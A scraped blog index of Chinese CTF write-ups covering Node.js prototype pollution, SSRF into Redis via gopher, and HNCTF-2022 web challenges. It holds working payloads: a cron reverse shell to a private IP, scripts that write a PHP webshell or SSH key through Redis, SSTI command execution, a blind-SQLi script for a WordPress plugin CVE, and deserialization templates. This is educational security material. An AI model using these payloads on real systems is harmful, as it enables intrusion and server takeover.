\u0026#39;model\u0026#39;);\rdefine(\u0026#39;DEFAULT_TEMPLATES_DIR\u0026#39;,\u0026#39;templates\u0026#39;);\rdefine(\u0026#39;DEFAULT_COOKIE\u0026#39;,\u0026#39;ctfshow\u0026#39;);\rdefine(\u0026#39;TEMPLATE_PATH\u0026#39;,WEB_APP_ROOT.DEFAULT_TEMPLATES_DIR.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;ACTION_PATH\u0026#39;,WEB_APP_ROOT.DEFAULT_ACTION_DIR.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;CLASS_PATH\u0026#39;,FRAMEWORK_ROOT.\u0026#39;class\u0026#39;.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;INCLUDE_PATH\u0026#39;,WEB_APP_ROOT.\u0026#39;include\u0026#39;.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;MODEL_PATH\u0026#39;,WEB_APP_ROOT.\u0026#39;model\u0026#39;.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;STATIC_PATH\u0026#39;,WEB_ROOT.\u0026#39;www\u0026#39;.DIRECTORY_SEPARATOR.\u0026#39;static\u0026#39;.DIRECTORY_SEPARATOR);\rdefine(\u0026#39;AVATAR_PATH\u0026#39;,STATIC_PATH.\u0026#39;img\u0026#39;.DIRECTORY_SEPARATOR.\u0026#39;avatar\u0026#39;.DIRECTORY_SEPARATOR);\rsession_start();\rrequire_once FRAMEWORK_ROOT.\u0026#39;ctfshow.php\u0026#39;;\rspl_autoload_register(function($class){\rif(file_exists(CLASS_PATH.strtolower($class).DEFAULT_EXT)){\rreturn include CLASS_PATH.strtolower($class).DEFAULT_EXT;\r}\rif(file_exists(MODEL_PATH.strtolower($class).DEFAULT_EXT)){\rreturn include MODEL_PATH.strtolower($class).DEFAULT_EXT;\r}\rif(file_exists(ACTION_PATH.strtolower($class).DEFAULT_EXT)){\rreturn include ACTION_PATH.strtolower($class).DEFAULT_EXT;\r}\r});\rctfshow::run();\r\u0026lt;script language=JavaScript\u0026gt; location.replace(location.href);\u0026lt;/script\u0026gt; 这里面又包含了一个ctfshow.php\n而且看了一下,ctfshow.php的路径是/var/www/html/framework/ctfshow.php\n下载下来源码是这样的:\n\u0026lt;?php\rclass ctfshow{\rprivate static $hook;\rpublic static function run(){\r$action = self::get_action();\r$method = self::get_method();\rself::$hook=new hook($action,$method,self::get_args());\rself::$hook-\u0026gt;$method();\r}\rpublic static function get_action(){\rif(isset($_COOKIE[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; preg_match(\u0026#39;/^[a-z]+$/\u0026#39;, $_COOKIE[\u0026#39;a\u0026#39;])){\rreturn $_COOKIE[\u0026#39;a\u0026#39;];\r}else{\rreturn DEFAULT_ACTION;\r}\r}\rpublic static function get_method(){\rif(isset($_COOKIE[\u0026#39;m\u0026#39;]) \u0026amp;\u0026amp; preg_match(\u0026#39;/^[a-z]+$/\u0026#39;, $_COOKIE[\u0026#39;m\u0026#39;])){\rreturn $_COOKIE[\u0026#39;m\u0026#39;];\r}else{\rreturn DEFAULT_METHOD;\r}\r}\rpublic static function get_args(){\r$ret = array();\rif($_COOKIE[DEFAULT_COOKIE]!=null){\r$args = $_COOKIE[DEFAULT_COOKIE];\rif($args!=\u0026#39;\u0026#39; \u0026amp;\u0026amp; strpos($args, \u0026#39;|\u0026#39;)\u0026gt;0){\r$ret= explode(\u0026#39;|\u0026#39;, $args);\r}\r}\rreturn $ret;\r}\r}\u0026lt;script language=JavaScript\u0026gt; location.replace(location.href);\u0026lt;/script\u0026gt; 到这里就没什么思路了\u0026hellip;..后面有wp了再学习学习\n","date":"2023-06-25","externalUrl":null,"permalink":"/posts/2023/06/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF%E5%90%83%E7%93%9C%E6%9D%AF/","section":"Posts","summary":"","title":"CTFshow-月饼杯\u0026吃瓜杯","type":"posts"},{"content":"\r继承与原型链 #\r在JavaScript中只有一种结构：对象（连函数也是一种对象）。\n每个对象都有一个_私有属性_，指向另一个名为“原型”（prototype）的对象。\n原型对象也有自己的一个原型，一层一层的直到一个对象的原型为_NULL_，Null处于原型链的顶端，或者说原型链的最后一环。\n继承属性 #\rJavaScript 对象有一个指向一个原型对象的链。\n当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。\n__proto__和prototype #\r在JavaScript中，每个对象都有一个名为__proto__的内置属性，它指向该对象的原型，类似于指针概念。\n同时，每个函数也都有一个名为 prototype（原型）的属性，它是一个对象，包含构造函数的原型对象应该具有的属性和方法。\n下面是一段代码举例\nfunction Person(name) {\rthis.name = name;\r}//一个带参构造函数，传入name并赋值\rPerson.prototype.greet = function() {\rconsole.log(`Hello, my name is ${this.name}`);//将prototype上的greet设置为一个打招呼的函数\r};\rconst person1 = new Person(\u0026#39;Alice\u0026#39;);\rperson1.greet(); // 输出 \u0026#34;Hello, my name is Alice\u0026#34; 当创建了person1的时候，person1里并没有greet，他会沿着原型链搜索并继承prototype中的greet函数。\n看看这段代码的执行情况\n从这里就可以看出，prototype是类Person的一个属性，所有用类Person进行实例化的对象，都会拥有prototype的全部内容。\n总结：\n1、prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法\r2、一个对象的__proto__属性，指向这个对象所在的类的prototype属性 我在网上找了两张图\n这一张是关于__proto__\n可以看到 f1 的__proto__指向了Foo.prototype，因为f1是从Foo这个函数里new的，所以他的原型是foo\nFoo()的__proto__指向了Function.prototype，因为他是一个函数，所以指向的函数的原型\n下面这张图是关于prototype的\n关于prototype，它是函数所独有的，它是从一个函数指向一个对象，它的含义是函数的原型对象\n__proto__和prototype的关系可以用下图表示\n原型链污染 #\r先举个例子\nvar a = {number : 520}\rvar b = {number : 1314}\rb.__proto__.number=520 var c= {}\rc.number 这段代码的执行情况如下\n这段代码中的 C 我是没有赋值的，但是执行出来是520\n原因是，b的proto其实指向的就是object的prototype\n在这里将object类里所有对象的number属性的值都设置为了520\n效果就如同下面这张图\n但是这时输出b的值就是1314，因为在b自己的属性中能够找到number属性\n系统只有在找不到的时候才会沿着原型链搜索，\n下面来实战演练一下\nCatCTF 2022 wife #\r源码如下：\napp.post(\u0026#39;/register\u0026#39;, (req, res) =\u0026gt; {\rlet user = JSON.parse(req.body)\rif (!user.username || !user.password) {\rreturn res.json({ msg: \u0026#39;empty username or password\u0026#39;, err: true })\r}\rif (users.filter(u =\u0026gt; u.username == user.username).length) {\rreturn res.json({ msg: \u0026#39;username already exists\u0026#39;, err: true })\r}\rif (user.isAdmin \u0026amp;\u0026amp; user.inviteCode != INVITE_CODE) {\ruser.isAdmin = false\rreturn res.json({ msg: \u0026#39;invalid invite code\u0026#39;, err: true })\r}\rlet newUser = Object.assign({}, baseUser, user)\rusers.push(newUser)\rres.json({ msg: \u0026#39;user created successfully\u0026#39;, err: false })\r}) 这里可以利用的点就是object.assign这个函数\nObject.assign() 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。\nObject.assign(target, source1，source2，source3\u0026hellip;..)\n该函数从source1到sourceN中将属性添加或覆盖到target中\nconst object1 = {\ra: 1,\rb: 2,\rc: 3\r};\rconst object2 = Object.assign({c: 4, d: 5}, object1);\rconsole.log(object2.c, object2.d);\r// expected output: 3 5相当于是括号内所有变量的集合体组成的object2 很明显这道题是要获得admin权限，但是源码里设置了isAdmin为false，就要进行原型链污染\n抓个包如下\n可以使用proto将所有类的isAdmin设置为true\n那么随便注册一个用户的时候都能通过验证\n关键就在于\n\u0026#34;__proto__\u0026#34;:{\u0026#34;isAdmin\u0026#34;:true} 参考链接：\n浅析CTF中的Node.js原型链污染 - FreeBuf网络安全行业门户\n帮你彻底搞懂JS中的prototype、__proto__与constructor（图解）_码飞_CC的博客-CSDN博客\nprototype与__proto__的区别和关系_prototype和__proto___白小白灬的博客-CSDN博客\n","date":"2023-06-24","externalUrl":null,"permalink":"/posts/2023/06/%E5%85%B3%E4%BA%8Enodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","section":"Posts","summary":"","title":"关于Nodejs原型链污染","type":"posts"},{"content":"\r什么是Redis？ #\rRedis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库。\nRESP协议 #\rRESP 协议是 redis 服务之间数据传输的通信协议，redis 客户端和 redis 服务端之间通信会采取 RESP 协议\n因此我们后续构造 payload 时也需要转换成 RESP 协议的格式。\nRESP在Redis中用作请求 - 响应协议的方式如下：\n客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。\n服务器根据命令实现回复一种RESP类型。\nRESP协议的格式如下：\n*1\r$8\rflushall\r*3\r$3\rset\r$1\r1\r$64\r*/1 * * * * bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.230.132/1234 0\u0026gt;\u0026amp;1\r*4\r$6\rconfig\r$3\rset\r$3\rdir\r$16\r/var/spool/cron/\r*4\r$6\rconfig\r$3\rset\r$10\rdbfilename\r$4\rroot\r*1\r$4\rsave\rquit *n 代表了一条命令的开始，n表示该条命令由n个字符串组成\n$n 表示了该字符串由n个字符组成\ngopher协议 #\r当探测内网或执行命令时需要发送 POST 请求，我们可以利用 gopher 协议\n协议格式\ngopher://\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;/\u0026lt;gopher-path\u0026gt; 这里的gopher-path就是相当于要发送的数据包，也就是我们要构造的RESP协议\n注意：gopher协议使用时，会吞噬掉gopher-path的第一个字符，通常用个下划线来填充这个字符\n绝对路径写入webshell #\r应用条件：\nredis有root权限\n知道网站的绝对路径\n首先要构造redis命令\nflushall //用于清空整个redis服务器的所有数据（删除所有数据库的所有 key ）\rset 1 \u0026#39;\u0026lt;?php eval($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39; //设立一个键值对\rconfig set dir /var/www/html //指定本地数据库存放目录\rconfig set dbfilename shell.php //指定本地数据库文件名，默认值为 dump.rdb\rsave 我们要将这条命令转化为RESP协议的格式再结合gopher协议达到写入shell的目的\n贴一个转换脚本：\n#!/usr/bin/env python\r# -*-coding:utf-8-*-\rimport urllib\rprotocol=\u0026#34;gopher://\u0026#34; # 使用的协议 ip=\u0026#34;\u0026#34;\rport=\u0026#34;\u0026#34; # 目标redis的端口号 shell=\u0026#34;\\n\\n\u0026lt;?php eval($_GET[\\\u0026#34;cmd\\\u0026#34;]);?\u0026gt;\\n\\n\u0026#34;\rfilename=\u0026#34;shell.php\u0026#34; # shell的名字 path=\u0026#34;/var/www/html\u0026#34; # 写入的路径\rpasswd=\u0026#34;\u0026#34; # 如果有密码 则填入\r# 我们的恶意命令 cmd=[\u0026#34;flushall\u0026#34;,\r\u0026#34;set 1 {}\u0026#34;.format(shell.replace(\u0026#34; \u0026#34;,\u0026#34;${IFS}\u0026#34;)),\r\u0026#34;config set dir {}\u0026#34;.format(path),\r\u0026#34;config set dbfilename {}\u0026#34;.format(filename),\r\u0026#34;save\u0026#34;\r]\rif passwd:\rcmd.insert(0,\u0026#34;AUTH {}\u0026#34;.format(passwd))\rpayload=protocol+ip+\u0026#34;:\u0026#34;+port+\u0026#34;/_\u0026#34;\rdef redis_format(arr):\rCRLF=\u0026#34;\\r\\n\u0026#34;\rredis_arr = arr.split(\u0026#34; \u0026#34;)\rcmd=\u0026#34;\u0026#34;\rcmd+=\u0026#34;*\u0026#34;+str(len(redis_arr))\rfor x in redis_arr:\rcmd+=CRLF+\u0026#34;$\u0026#34;+str(len((x.replace(\u0026#34;${IFS}\u0026#34;,\u0026#34; \u0026#34;))))+CRLF+x.replace(\u0026#34;${IFS}\u0026#34;,\u0026#34; \u0026#34;)\rcmd+=CRLF\rreturn cmd\rif __name__==\u0026#34;__main__\u0026#34;:\rfor x in cmd:\rpayload += urllib.quote(redis_format(x))\rprint payload\rprint urllib.quote(\u0026#34;二次url编码后的结果:\\n\u0026#34; + payload) 用这个脚本生成的话应该在最后加一个%0A作为语句的截断，不然就无法执行命令。\nRedis写入ssh公钥 #\r条件：redis有root权限\n原理：通过在目标机器上写入 ssh 公钥，然后便可以通过 ssh 免密码登录目标机器\n首先要生成 ssh 公/私钥\n执行这段命令\nssh-keygen -t rsa 会在 /root/.ssh/目录下生成ssh 公/私钥\n我们想要构造的payload：\nflushall\rset 1 \u0026#39;id_rsa.pub 里的内容\u0026#39;\rconfig set dir \u0026#39;/root/.ssh/\u0026#39;\rconfig set dbfilename authorized_keys\rsave 利用以下脚本将payload转化为RESP的格式：\nimport urllib\rprotocol=\u0026#34;gopher://\u0026#34;\rip=\u0026#34;\u0026#34;\rport=\u0026#34;\u0026#34;\rsshpublic_key = \u0026#34;\\n\\nid_rsa.pub 里的内容\\n\\n\u0026#34;\rfilename=\u0026#34;authorized_keys\u0026#34;\rpath=\u0026#34;/root/.ssh/\u0026#34;\rpasswd=\u0026#34;\u0026#34;\rcmd=[\u0026#34;flushall\u0026#34;,\r\u0026#34;set 1 {}\u0026#34;.format(sshpublic_key.replace(\u0026#34; \u0026#34;,\u0026#34;${IFS}\u0026#34;)),\r\u0026#34;config set dir {}\u0026#34;.format(path),\r\u0026#34;config set dbfilename {}\u0026#34;.format(filename),\r\u0026#34;save\u0026#34;\r]\rif passwd:\rcmd.insert(0,\u0026#34;AUTH {}\u0026#34;.format(passwd))\rpayload=protocol+ip+\u0026#34;:\u0026#34;+port+\u0026#34;/_\u0026#34;\rdef redis_format(arr):\rCRLF=\u0026#34;\\r\\n\u0026#34;\rredis_arr = arr.split(\u0026#34; \u0026#34;)\rcmd=\u0026#34;\u0026#34;\rcmd+=\u0026#34;*\u0026#34;+str(len(redis_arr))\rfor x in redis_arr:\rcmd+=CRLF+\u0026#34;$\u0026#34;+str(len((x.replace(\u0026#34;${IFS}\u0026#34;,\u0026#34; \u0026#34;))))+CRLF+x.replace(\u0026#34;${IFS}\u0026#34;,\u0026#34; \u0026#34;)\rcmd+=CRLF\rreturn cmd\rif __name__==\u0026#34;__main__\u0026#34;:\rfor x in cmd:\rpayload += urllib.quote(redis_format(x))\rprint payload\rprint urllib.quote(\u0026#34;二次url编码后的结果:\\n\u0026#34; + payload) 配合gopher访问一下，此时要注意靶机的ssh服务一定要是开启的状态。\n写入就可以通过ssh连接靶机获得shell权限\nssh公钥和私钥 #\r如果要使用 ssh 连接服务，首先我们需要生成私钥和公钥，私钥留在本地，公钥上传到服务器，这样在连接时，才可以做认证服务。 初始时，对于 linux 系统上的每一个用户，对应的 home 目录下都有一个 .ssh 隐藏目录 ，就是用来存放生成的秘钥和私钥的 如果成功的话，之后连接，就不必使用密码方式。\n参考链接\nSSRF + Redis 利用方式学习笔记 - 1ndex- - 博客园 (cnblogs.com)\n浅析Redis中SSRF的利用 - 先知社区 (aliyun.com)\n","date":"2023-06-19","externalUrl":null,"permalink":"/posts/2023/06/redis%E4%B8%8Essrf/","section":"Posts","summary":"","title":"浅谈Redis与SSRF","type":"posts"},{"content":"","date":"2023-06-17","externalUrl":null,"permalink":"/tags/hnctf/","section":"Tags","summary":"","title":"Hnctf","type":"tags"},{"content":"\rweek1 #\r2048 #\r一个2048小游戏，先看看源码\n在源码中看到游戏的js文件\n找找看有没有flag\n找到这一段代码\n原来要超过20000分才弹出flag，这里直接把代码放到控制台运行，弹出flag\nInteresting_include #\r文件包含,没什么难度\npayload: ?filter=php://filter/convert.base64-encode/resource=flag.php 然后将得到的字符串拿去base64解码即可\neasy_upload #\r随便上传一个1.php，然后用蚁剑连接，在根目录下得到flag\neasy_html #\r饼干？那就是cookie咯，在浏览器里看看\n在请求头里看到flag的信息，访问这个php文件\n随便输一个手机号码，但是都没什么用，于是审查一下源码\n谁的电话号只有10位啊？应该要修改一下变成11位\n修改过后随便输11位数字就弹出flag，很基本的前端问题\nWhat is web #\r上源码\n在注释里面看到flag，base64解密一下就行了\nInteresting_http #\r又是一道http的题\n那就给他一个want吧\n不是管理员身份，抓个包看看\n原来在cookie里面设置了管理员身份\n只需要修改为 user=admin 即可绕过\n不在本地，那么就加一个XFF头吧\nX-Forwarded-For:127.0.0.1 Challenge_rce #\r源码里给出提示，要GET一个hint\n无参数RCE一般有三种思路，自增、取反、异或\n这里就试试自增吧\n由于php变量没有赋值时默认是零，且数组与字符串拼接时返回Array\n\u0026lt;?php\r$_=_.[];\recho $_; 执行结果就是输出一个Array（我用的php5会报错，php7就不会）\n然后用其中的字母进行自增构造执行语句\n这样是能构造出GET的，但是长度会超过限制，得想想其它的办法\n可以使用chr()函数，因为没有对数字进行过滤，可以直接通过数字获得字母\n获得chr函数后就很容易得到GET，如图下\n\u0026lt;?php\r$_=[]._;\r$__=$_[1];\r$_=$_[0];\r$_++;\r$_1=++$_;\r$_++;\r$_++;\r$_++;\r$_++;\r$_=$_1.++$_.$__;//chr\r$_=_.$_(71).$_(69).$_(84);//GET\r$$_[1]($$_[2]); 相当于在最后构造了一个 $_GET[_]($_GET[__])\n传两个参数，一个作为函数名，另一个作为命令\npost的时候注意将rce进行urlencode编码一下\n得到flag\nweek2 #\rez_SSTI #\r给了一个链接点进去看看\n好像是要GET一个name参数\n试试看看\n直接开始注入\npayload:{{lipsum.__globals__.__getitem__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read()}}\r或者\r{{url_for.__globals__.os.popen(\u0026#39;ls\u0026#39;).read()}} 没过滤什么东西，有很多语句都能注入\nez_ssrf #\r进去是下面这个界面\n题目提示访问index.php\n如下\n\u0026lt;?php\rhighlight_file(__FILE__);\rerror_reporting(0);\r$data=base64_decode($_GET[\u0026#39;data\u0026#39;]);\r$host=$_GET[\u0026#39;host\u0026#39;];\r$port=$_GET[\u0026#39;port\u0026#39;];\r$fp=fsockopen($host,intval($port),$error,$errstr,30);\rif(!$fp) {\rdie();\r}\relse {\rfwrite($fp,$data);\rwhile(!feof($data))\r{\recho fgets($fp,128);\r}\rfclose($fp);\r} 该代码的作用是通过将传递的参数$data进行base64解码后，将数据发送到指定的主机$host和端口$port，并读取响应数据。这里并没有做任何的过滤。\n直接伪造host为127.0.0.1\nport为80，因为http默认为80端口\n那么对于data的内容就要复杂点了\n\u0026lt;?php\r$out = \u0026#34;GET /flag.php HTTP/1.1\\r\\n\u0026#34;;\r$out .= \u0026#34;Host: 127.0.0.1\\r\\n\u0026#34;;\r$out .= \u0026#34;Connection: Close\\r\\n\\r\\n\u0026#34;;\recho base64_encode($out);\r?\u0026gt; 这里搬运一下别人的代码↑\n这个data伪造了一个http请求\npayload：index.php?host=127.0.0.1\u0026amp;port=80\u0026amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo= easy_include #\r\u0026lt;?php\r//WEB手要懂得搜索\rif(isset($_GET[\u0026#39;file\u0026#39;])){\r$file = $_GET[\u0026#39;file\u0026#39;];\rif(preg_match(\u0026#34;/php|flag|data|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=/i\u0026#34;, $file)){\rdie(\u0026#34;error\u0026#34;);\r}\rinclude($file);\r}else{\rhighlight_file(__FILE__);\r} 这里涉及到了user-agent的木马注入\n文件日志默认地址为/var/log/nginx/access.log\n访问会在日志文件中留下UA头里的东西，抓个包，把ua头改为一句话木马\n再将日志文件包含，即可爆出flag\n原理：文件包含 include能执行括号内的命令，所以包含了日志的时候，执行了一句话木马。\nCanyource #\r\u0026lt;?php\rhighlight_file(__FILE__);\rif(isset($_GET[\u0026#39;code\u0026#39;])\u0026amp;\u0026amp;!preg_match(\u0026#39;/url|show|high|na|info|dec|oct|pi|log|data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i\u0026#39;, $_GET[\u0026#39;code\u0026#39;])){\rif(\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[^\\W]+\\((?R)?\\)/\u0026#39;, \u0026#39;\u0026#39;, $_GET[\u0026#39;code\u0026#39;])) { eval($_GET[\u0026#39;code\u0026#39;]);}\relse\rdie(\u0026#39;nonono\u0026#39;);}\relse\recho(\u0026#39;please input code\u0026#39;);\r?\u0026gt; \\w 的释义一般都是指包含大小写字母数字和下划线\nR 是正则的递归模式\n这个正则替换就是把 ”函数名（函数内容）“ 替换成空，直到最后只剩一个分号\n这种情况就只有用php函数来读取文件了\npayload：print_r(scandir(current(localeconv()))); 可以扫出当前目录的文件\n看到flag在第三个，那就反转一下，再next指向第二个就行了\n但是high和show被检测到了，那么就不能使用highlight_file和show_source函数了\n得想想其他办法\nphp中有一个函数是 readfile()\n用来读取文件的，这里刚好没有过滤\n构造如下\npayload；readfile(next(array_reverse(scandir(current(localeconv()))))); easy_unser #\r一道反序列化的题\n代码真的长。。。。花里胡哨的\n先审计一下代码吧。\n下面那个类没什么用\n关键是上面那个类的want，我们要将其highlight_file\n要要注意绕过wake函数，把序列化的属性加1就行\n好像是php7以后对public和private不敏感\n这道题无法使用public\n\u0026lt;?php\rclass body{\rpublic $want=\u0026#39;php://filter/resource=f14g.php\u0026#39;;\rpublic $todonothing=\u0026#39;123\u0026#39;;\r}\r$a=new body;\recho serialize($a);\r?\u0026gt; 我的php代码是这样的，不过看到一些wp上把序列字符串进行了urlencode，这里不加密也能执行\n要注意的是生成的字符串如下\nO:4:\u0026#34;body\u0026#34;:2:{s:10:\u0026#34; body want\u0026#34;;s:30:\u0026#34;php://filter/resource=f14g.php\u0026#34;;s:17:\u0026#34; body todonothing\u0026#34;;s:3:\u0026#34;123\u0026#34;;} 由于变量的属性是private，在name里会有特殊字符不可见，应该将其修改为%00\n才能生效\n最后记得把属性个数加一\n最终payload：?ywant=O:4:\u0026#34;body\u0026#34;:3:{s:10:\u0026#34;%00body%00want\u0026#34;;s:30:\u0026#34;php://filter/resource=f14g.php\u0026#34;;s:17:\u0026#34;%00body%00todonothing\u0026#34;;s:3:\u0026#34;123\u0026#34;;} easy_sql #\rsql题来咯！\n随便测试一下，发现是字符型注入\n而且空格被过滤了，用/**/绕过\nand居然也被过滤了\n只能一个一个试了，发现有三列。\n0\u0026#39;union/**/select/**/1,2,database()/**/where/**/\u0026#39;1 继续爆破\ninformation_schema也被过滤了。。。\n还好我留了几个功能差不多的\nsys.schema_table_statistic_with_buffer (列名与information_schema一样)\rsys.x$ps_schema_table_statistics_io\rmysql.innodb_table_stats 用第三个吧，字数少一些。\n构造如下\n0\u0026#39;union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where/**/\u0026#39;1 为什么会有三个一样的库？\n查了一下资料innodb无法查列名\n实在是弄不明白，上答案\n0\u0026#39;union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/\u0026#39;1 看了一会有些思路\nwp里的反引号括起来的1是指的表中名字为‘1’的那一列\n括号里的是1联合查询ctftraining.flag里的所有列，并命名为a\nflag有可能不在第一列中，所以用通配符*进行匹配\n然后和 select的1组合起来形成一列\n头都快炸了。。。\nohmywordpress #\r没啥思路，上网搜搜\n发现 CVE-2022-0760\n是一个时间盲注的题\n直接上脚本\nimport requests\rimport time\r# 这里我们直接猜测flag和上一个sql注入的flag位置相同\r# flag\r# ctftraining.flag\rurl = \u0026#34;http://node2.anna.nssctf.cn:28433/wp-admin/admin-ajax.php\u0026#34;\rdict=\u0026#34;NSSCTF{_-abcdefghijklmnopqrstuvwxyz0123456789}~\u0026#34;\rdef get_values():\rcount = 8\rflag = \u0026#39;\u0026#39;\rwhile True:\rfor i in dict:\rdata = {\r\u0026#34;action\u0026#34;: \u0026#34;qcopd_upvote_action\u0026#34;,\r\u0026#34;post_id\u0026#34;: f\u0026#34;(SELECT 3 FROM (SELECT if(ascii(substr((select group_concat(flag) from ctftraining.flag),{count},1))={ord(i)}, sleep(2),0))enz)\u0026#34;\r}\rprint(i)\rstart_time = time.time()\rresp = requests.post(url=url, data=data)\rend_time = time.time()\rif end_time-start_time\u0026gt;=1.5:\rflag += i\rprint(flag)\rcount += 1\rbreak\relif i == \u0026#34;~\u0026#34;:\rreturn False\rtime.sleep(0.05)\rget_values() week3 #\rssssti #\r通过name传参\n不过这道题过滤了一些东西\n我比较喜欢的一个payload：\n{{lipsum.__globals__.__getitem__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read()}} 但是被检测到了\n那想想怎么绕过\n{{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}\u0026amp;a=__globals__\u0026amp;b=os\u0026amp;c=ls 通过引入参数是可以的\n看看别人的wp\n?name={{config[request.values.a][request.values.b][request.values.c][request.values.d].popen(request.values.f).read()}}\u0026amp;a=class\u0026amp;b=init\u0026amp;c=globals\u0026amp;d=os\u0026amp;f=cat flag 或者\n?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}\u0026amp;a=globals\u0026amp;b=os\u0026amp;c=cat /flag 方法很多。\nFun_php #\r审计代码\n\u0026lt;?php\rerror_reporting(0);\rhighlight_file(__FILE__);\rinclude \u0026#34;k1y.php\u0026#34;;\rinclude \u0026#34;fl4g.php\u0026#34;;\r$week_1 = false;\r$week_2 = false;\r$getUserID = @$_GET[\u0026#39;user\u0026#39;]; $getpass = (int)@$_GET[\u0026#39;pass\u0026#39;]; $getmySaid = @$_GET[\u0026#39;mySaid\u0026#39;]; $getmyHeart = @$_GET[\u0026#39;myHeart\u0026#39;]; $data = @$_POST[\u0026#39;data\u0026#39;];\r$verify =@$_POST[\u0026#39;verify\u0026#39;];\r$want = @$_POST[\u0026#39;want\u0026#39;];\r$final = @$_POST[\u0026#39;final\u0026#39;];\rif(\u0026#34;Welcom\u0026#34;==0\u0026amp;\u0026amp;\u0026#34;T0\u0026#34;==0\u0026amp;\u0026amp;\u0026#34;1he\u0026#34;==1\u0026amp;\u0026amp;\u0026#34;HNCTF2022\u0026#34;==0)\recho \u0026#34;Welcom T0 1he HNCTF2022\u0026lt;BR\u0026gt;\u0026#34;;\rif(\u0026#34;state_HNCTF2022\u0026#34; == 1) echo $hint;\relse echo \u0026#34;HINT? NoWay~!\u0026lt;BR\u0026gt;\u0026#34;;\rif(is_string($getUserID))\r$user = $user + $getUserID; //u5er_D0_n0t_b3g1n_with_4_numb3r\rif($user == 114514 \u0026amp;\u0026amp; $getpass == $pass){\rif (!ctype_alpha($getmySaid)) die();\rif (!is_numeric($getmyHeart)) die();\rif(md5($getmySaid) != md5($getmyHeart)){\rdie(\u0026#34;Cheater!\u0026#34;);\r}\relse\r$week_1 = true;\r}\rif(is_array($data)){\rfor($i=0;$i\u0026lt;count($data);$i++){\rif($data[$i]===\u0026#34;Probius\u0026#34;) exit();\r$data[$i]=intval($data[$i]);\r}\rif(array_search(\u0026#34;Probius\u0026#34;,$data)===0)\r$week_2 = true;\relse\rdie(\u0026#34;HACK!\u0026#34;);\r}\rif($week_1 \u0026amp;\u0026amp; $week_2){\rif(md5($data)===md5($verify))\r// ‮⁦HNCTF⁩⁦Welcome to\rif (\u0026#34;hn\u0026#34; == $_GET[\u0026#39;hn\u0026#39;] \u0026amp;‮⁦+!!⁩⁦\u0026amp; \u0026#34;‮⁦ Flag!⁩⁦ctf\u0026#34; == $_GET[‮⁦LAG⁩⁦ctf]) { //HN! flag!! F\rif(preg_match(\u0026#34;/php|\\fl4g|\\\\$|\u0026#39;|\\\u0026#34;/i\u0026#34;,$want)Or is_file($want))\rdie(\u0026#34;HACK!\u0026#34;);\relse{\recho \u0026#34;Fine!you win\u0026#34;;\rsystem(\u0026#34;cat ./$want\u0026#34;);\r}\r}\relse\rdie(\u0026#34;HACK!\u0026#34;);\r} 思路还是比较清晰的\n首先user要等于114514，而且还要是字符串，幸好是弱比较\n直接user=114514a即可\n然后下面是一个md5的弱比较，要求一个纯字母一个纯数字，印象中刚好有两个这样的字符串\nmySaid=QNKCDZO\u0026amp;myHeart=240610708 week1变为true，现在就差week2了，看看下面那部分\ndata要是数组，data[]=0就可以了\nMD5比较，verify[]=1绕过\n因为md5不能加密数组，加密会返回null\n这里有点奇怪，后面那个flag怎么颜色不一样？\n想起来之前做过一道题，出题人在php代码里加了一些不可见字符\n试试把源码放到phpstorm上试试\n果然是这样！！！\n将其复制到编码网站，用urlencode一下在进行传参\n我用的hackbar每次都不行不知道为什么\n在源码里拿到flag\nez_phar #\r没有直接反序列化的点\n题目也让上传东西，那么应该是phar反序列化的知识\n发现有upload.php\n应该是从这里上传phar文件\n一个基本的生成phar文件的模板👇\n\u0026lt;?php\rclass Flag{\rpublic $code = \u0026#34;system(\u0026#39;cat /ffflllaaaggg\u0026#39;);\u0026#34;; //system(\u0026#39;ls /\u0026#39;);\r}\r$a = new Flag();\r$phar = new phar(\u0026#39;b.phar\u0026#39;);//对phar对象进行实例化，以便后续操作。\r$phar -\u0026gt; startBuffering();//缓冲phar写操作（不用特别注意）\r$phar -\u0026gt; setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;);//设置stub，为固定格式\r$phar -\u0026gt; setMetadata($a);//把我们的对象写进Metadata中\r$phar -\u0026gt; addFromString(\u0026#34;test.txt\u0026#34;,\u0026#34;helloworld!!\u0026#34;);//写压缩文件的内容，这里没利用点，可以随便写\r$phar -\u0026gt; stopBuffering();//停止缓冲\r?\u0026gt;\r","date":"2023-06-17","externalUrl":null,"permalink":"/posts/2023/06/hnctf-2022/","section":"Posts","summary":"","title":"HNCTF-2022","type":"posts"},{"content":"\r我flag呢？ 